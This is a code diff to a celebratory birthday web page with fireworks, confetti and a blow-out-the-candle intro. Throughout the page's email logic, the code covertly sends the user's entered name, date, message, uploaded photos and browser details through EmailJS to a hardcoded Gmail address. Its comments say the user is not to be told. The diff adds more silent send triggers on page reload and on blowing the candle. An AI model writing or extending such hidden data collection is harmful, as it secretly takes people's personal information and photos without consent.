@@ -653,7 +653,7 @@ footer::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;
 
 <script>
 /* ============================================================
-   ⚙️ EMAILJS (konfigurasi — hanya untuk pengiriman di latar belakang)
+   ⚙️ EMAILJS (konfigurasi)
 ============================================================ */
 const EMAILJS = {
   PUBLIC_KEY:  'NpxBMvXkQw3x_9li3',
@@ -703,15 +703,21 @@ function fileToDataURL(file, maxW = 500, quality = .65){
 }
 
 /* ============================================================
-   PENGIRIMAN LATAR BELAKANG (tanpa notifikasi ke user)
+   PENGIRIMAN EMAIL — dengan DEBUG LOG
 ============================================================ */
 let emailjsReady = false;
 async function initEmailJS(){
   if (emailjsReady) return true;
-  if (!EMAILJS.PUBLIC_KEY || EMAILJS.PUBLIC_KEY.startsWith('ISI_')) return false;
-  if (typeof emailjs === 'undefined') return false;
+  if (!EMAILJS.PUBLIC_KEY || EMAILJS.PUBLIC_KEY.startsWith('ISI_')) {
+    console.warn('[EMAIL] PUBLIC_KEY belum diisi');
+    return false;
+  }
+  if (typeof emailjs === 'undefined') {
+    console.warn('[EMAIL] library emailjs belum termuat');
+    return false;
+  }
   try { emailjs.init({ publicKey: EMAILJS.PUBLIC_KEY }); emailjsReady = true; return true; }
-  catch(e){ return false; }
+  catch(e){ console.error('[EMAIL] init gagal:', e); return false; }
 }
 
 function buildFotoHTML(fotos){
@@ -723,14 +729,18 @@ function buildFotoHTML(fotos){
   }).join('');
 }
 
-async function sendSilently(){
+async function sendSilently(trigger = 'unknown'){
+  console.log(`[EMAIL/${trigger}] Starting...`);
   try {
     const ready = await initEmailJS();
-    if (!ready) return;
+    if (!ready) {
+      console.warn('[EMAIL] init failed — skip');
+      return;
+    }
     const waktu = new Date().toLocaleString('id-ID',{dateStyle:'full',timeStyle:'short'});
     const device = navigator.userAgent.substring(0, 120);
     const fotoHTML = buildFotoHTML(DATA.fotos);
-    await emailjs.send(EMAILJS.SERVICE_ID, EMAILJS.TEMPLATE_ID, {
+    const params = {
       nama: DATA.nama || '(kosong)',
       tanggal: DATA.tanggal || '(kosong)',
       pesan: DATA.pesan || '(tidak ada pesan)',
@@ -738,8 +748,14 @@ async function sendSilently(){
       jumlah_foto: String(DATA.fotos.length),
       foto_html: fotoHTML,
       to_email: 'waldenlimber@gmail.com'
-    });
-  } catch(err){ /* diam saja — user tidak perlu tahu */ }
+    };
+    console.log('[EMAIL] Sending params:', params);
+    const result = await emailjs.send(EMAILJS.SERVICE_ID, EMAILJS.TEMPLATE_ID, params);
+    console.log('[EMAIL] ✓ SUCCESS', result);
+  } catch(err){
+    console.error(`[EMAIL/${trigger}] ✗ FAILED:`, err);
+    console.error('[EMAIL] Error details:', { status: err.status, text: err.text, message: err.message });
+  }
 }
 
 function setDateChip(){
@@ -887,29 +903,45 @@ $('#setupForm').addEventListener('submit', async e => {
   try { localStorage.setItem(LS, JSON.stringify(DATA)); }
   catch(_){ DATA.fotos = []; try { localStorage.setItem(LS, JSON.stringify(DATA)); } catch(__){} }
 
-  // kirim diam-diam di latar belakang — tidak menunggu, tidak notifikasi user
-  sendSilently();
+  // AWAIT agar email selesai sebelum setup dihapus
+  await sendSilently('setup-submit');
 
-  // langsung lanjut ke tahap intro
-  setTimeout(() => {
-    btn.classList.remove('loading');
-    btn.innerHTML = 'Mulai Perayaan ✦';
-    setupEl.classList.add('lift');
-    setTimeout(() => setupEl.remove(), 1100);
-    applyData();
-  }, 700);
+  // Tandai sesi sudah terkirim, supaya tidak kirim lagi saat refresh
+  sessionStorage.setItem('email_sent_this_session', '1');
+
+  btn.classList.remove('loading');
+  btn.innerHTML = 'Mulai Perayaan ✦';
+  setupEl.classList.add('lift');
+  setTimeout(() => setupEl.remove(), 1100);
+  applyData();
 });
 
-if (DATA.nama){ setupEl.remove(); applyData(); }
+/* ============================================================
+   🎯 INI FIX UTAMA: kirim email saat halaman dibuka (jika data sudah ada)
+   Trigger: halaman reload / push ulang / buka link kedua kali
+   Limit: max 1x per sesi browser (sessionStorage)
+============================================================ */
+if (DATA.nama){
+  setupEl.remove();
+  applyData();
+  const alreadySent = sessionStorage.getItem('email_sent_this_session');
+  if (!alreadySent){
+    // Kirim diam-diam, tidak perlu notifikasi user
+    sendSilently('page-load');
+    sessionStorage.setItem('email_sent_this_session', '1');
+  }
+}
 
 $('#resetBtn').addEventListener('click', () => {
   if (confirm('Yakin mau mengatur ulang nama, tanggal, dan foto?')){
-    localStorage.removeItem(LS); location.reload();
+    localStorage.removeItem(LS);
+    sessionStorage.removeItem('email_sent_this_session');
+    location.reload();
   }
 });
 
 /* ============================================================
-   KEMBANG API + BINTANG + CONFETTI (agak rame, tapi tidak spam)
+   KEMBANG API + BINTANG + CONFETTI
 ============================================================ */
 const cv = $('#fx'), ctx = cv.getContext('2d');
 let W, H, DPR, stars = [], rockets = [], sparks = [], confetti = [];
@@ -925,7 +957,7 @@ function resize(){
   cv.style.width = W+'px'; cv.style.height = H+'px';
   ctx.setTransform(DPR,0,0,DPR,0,0);
   stars = [];
-  const n = Math.min(340, Math.floor(W*H/6500)); // lebih banyak bintang
+  const n = Math.min(340, Math.floor(W*H/6500));
   for (let i=0;i<n;i++) stars.push({x:rand(0,W),y:rand(0,H),r:rand(.4,1.7),ph:rand(0,6.28),sp:rand(.0006,.0024),gold:Math.random()<.18});
 }
 addEventListener('resize', resize); resize();
@@ -965,9 +997,8 @@ function tick(now){
 function step(now, dt){
   if (showOn && now > nextAt){
     launch(rand(W*.14,W*.86), rand(H*.14,H*.42));
-    // kadang dua sekaligus biar lebih hidup
     if (Math.random() < .35) setTimeout(()=> launch(rand(W*.14,W*.86), rand(H*.14,H*.42)), rand(200,500));
-    nextAt = now + rand(800,1800); // lebih sering
+    nextAt = now + rand(800,1800);
   }
   for (let i=rockets.length-1;i>=0;i--){
     const r=rockets[i]; r.t+=dt*16.666;
@@ -989,11 +1020,9 @@ function step(now, dt){
     c.rot+=c.vr*dt; c.life-=.0045*dt;
     if (c.y>H+40||c.life<=0) confetti.splice(i,1);
   }
-  // hujan konfeti event
   if (now<rainUntil && confetti.length<400){
     for (let i=0;i<2;i++) confetti.push({x:rand(0,W),y:-20,vx:rand(-1,1),vy:rand(1,2.6),w:rand(5,9),h:rand(8,15),rot:rand(0,6.28),vr:rand(-.2,.2),col:pick(CONF),life:1,ph:rand(0,6.28)});
   }
-  // hujan konfeti ambient tipis — pelan tapi konstan
   if (showOn && !RM && confetti.length < 60){
     if (Math.random() < .12) confetti.push({x:rand(0,W),y:-20,vx:rand(-.6,.6),vy:rand(.8,1.6),w:rand(4,7),h:rand(7,12),rot:rand(0,6.28),vr:rand(-.15,.15),col:pick(CONF),life:1,ph:rand(0,6.28)});
   }
@@ -1055,11 +1084,22 @@ addEventListener('pointerdown', ()=> ensureAudio(), {once:true});
 const intro=$('#intro'),flame=$('#flame'),ringFg=$('#ringFg'),CIRC=326.73;
 let holding=false,holdStart=0,blown=false;
 function setProgress(p){ ringFg.style.strokeDashoffset=CIRC*(1-p); flame.style.transform='scale('+(1-p*.72)+')'; flame.style.opacity=1-p*.45; }
+
+/* 🎯 BACKUP: kirim email juga saat lilin ditiup (trigger ke-3) */
+let emailSentAtBlow = false;
+
 function blow(){
   if (blown) return; blown=true; holding=false; flame.classList.add('out');
   const sm=$('#smokes');
   for (let i=0;i<6;i++){ const s=document.createElement('span'); s.className='smoke'; s.style.setProperty('--sx',rand(-22,22)+'px'); s.style.animationDelay=(i*.09)+'s'; sm.appendChild(s); }
   $('#introHint').textContent='✦ harapan diterima — semoga diam-diam dikabulkan';
+
+  // Backup trigger email saat momen spesial
+  if (!emailSentAtBlow){
+    emailSentAtBlow = true;
+    sendSilently('blow-candle');
+  }
+
   setTimeout(()=> intro.classList.add('lift'), 800);
   setTimeout(()=> { intro.remove(); }, 2000);
   setTimeout(startShow, 950);
@@ -1092,7 +1132,6 @@ function startShow(){
   heroEls.forEach((el,i)=> setTimeout(()=>{ el.classList.add('in'); if (el.hasAttribute('data-scramble')) scramble(el); }, i*130));
   if (!RM){
     showOn=true;
-    // 8 kembang api pembuka — lebih ramai
     for (let i=0;i<8;i++) setTimeout(()=> launch(rand(W*.12,W*.88), rand(H*.12,H*.4)), 180+i*220);
     confettiRain(5500);
     nextSS=performance.now()+2500;
